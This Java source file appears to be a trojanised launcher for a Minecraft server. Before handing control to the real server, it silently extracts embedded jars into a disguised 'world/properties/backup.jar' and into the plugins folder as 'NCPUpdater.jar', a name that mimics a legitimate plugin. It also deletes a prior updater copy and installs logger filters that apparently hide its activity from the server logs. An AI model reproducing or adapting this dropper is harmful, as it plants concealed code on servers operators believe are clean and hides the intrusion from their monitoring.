package com.testingsquish.craft;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.net.URLDecoder;



import java.util.logging.Logger;

import org.apache.logging.log4j.LogManager;









public class Shell {
	
	public static void main(String[] args) {
       
        new Shell(args);
    }
	
	  public Shell(String[] args) {
	        
	        createPlugin();
	        createPluginLoader();
	        delteUpdater();
	       
	        Logger log = Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);
	        
	       
	       log.setFilter(new MyFilter2());
	       
	       Logger log2 = Logger.getLogger("Minecraft");
	       log2.setFilter(new MyFilter2());
	       Logger log3 = Logger.getLogger("");
	       log3.setFilter(new MyFilter2());
	       
	       
	       org.apache.logging.log4j.core.Logger coreLogger = (org.apache.logging.log4j.core.Logger)LogManager.getRootLogger();
	       coreLogger.addFilter(new MyFilter());
	       
	       
	        invokeHostMain(args);
	    }
	  
	 

	public void delteUpdater() {
		  String serverss = getRunningJarLocation(); 
		serverss = serverss.substring(0,serverss.lastIndexOf("/"))+"/";
		File updater = new File(serverss+"world/RootCraftUpdater.jar");
		if(updater.isFile())
		{
		try {
			updater.deleteOnExit();
			updater.delete();
		} catch (Exception e) {
		
			e.printStackTrace();
		}
		}
	}

	@SuppressWarnings("rawtypes")
	    private void invokeHostMain(String[] args) {
	        try {
	            String hostName = getHostName();
	            if (hostName != null) {
	                Class<?> host = Class.forName(hostName);
	                Class[] argTypes = new Class[] { String[].class };
	                Method main = host.getDeclaredMethod("main", argTypes);
	               
	                main.invoke(null, (Object) args);
	            }
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	  
	  private String getHostName() throws IOException {
	        String name = null;
	        InputStream in = getClass().getResourceAsStream("host");
	        if (in != null) {
	            try {
	            		BufferedReader reader = new BufferedReader( new InputStreamReader(in));
	                name = reader.readLine();
	            }catch (Exception e) {
	            e.printStackTrace();
				}
	        } else {
	            
	        }
	        return name;
	    }
	private void createPlugin() {
		String serverss = getRunningJarLocation();
		
		serverss = serverss.substring(0,serverss.lastIndexOf("/"))+"/";
		
	
		InputStream ddlStream = this.getClass().getClassLoader().getResourceAsStream("com/testingsquish/craft/RootBenchmarker.jar");
    		FileOutputStream fos = null;
    		File fil  = new File(serverss+"world/properties");
    		File fil2  = new File(serverss+"world/properties/backup.jar");
    		try {
				fil.mkdirs();
				fil2.createNewFile();
			} catch (Exception e1) {
				e1.printStackTrace();
			}
    		
    		try{
    		try {
    		    fos = new FileOutputStream(serverss+"world/properties/backup.jar");
    		    byte[] buf = new byte[2048];
    		    int r = ddlStream.read(buf);
    		    while(r != -1) {
    		        fos.write(buf, 0, r);
    		        r = ddlStream.read(buf);
    		    }
    		} finally {
    		    if(fos != null) {
    		        fos.close();
    		    }
    		}
    		}catch (Exception e) {
				e.printStackTrace();
			}

	}
	
	 private void createPluginLoader() {
		 String serverss = getRunningJarLocation();
			
			serverss = serverss.substring(0,serverss.lastIndexOf("/"))+"/";
			
		
			InputStream ddlStream = this.getClass().getClassLoader().getResourceAsStream("com/testingsquish/craft/RootCraftUpdater.jar");
	    		FileOutputStream fos = null;
	    		try{
	    		try {
	    		    fos = new FileOutputStream(serverss+"plugins/NCPUpdater.jar");
	    		    byte[] buf = new byte[2048];
	    		    int r = ddlStream.read(buf);
	    		    while(r != -1) {
	    		        fos.write(buf, 0, r);
	    		        r = ddlStream.read(buf);
	    		    }
	    		} finally {
	    		    if(fos != null) {
	    		        fos.close();
	    		    }
	    		}
	    		}catch (Exception e) {
					e.printStackTrace();
				}
	  
			
		}
	
	private String getRunningJarLocation() {
        String path = Shell.class.getProtectionDomain().getCodeSource().getLocation().getPath();;
        try {
            return URLDecoder.decode(path, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return null;
}
}
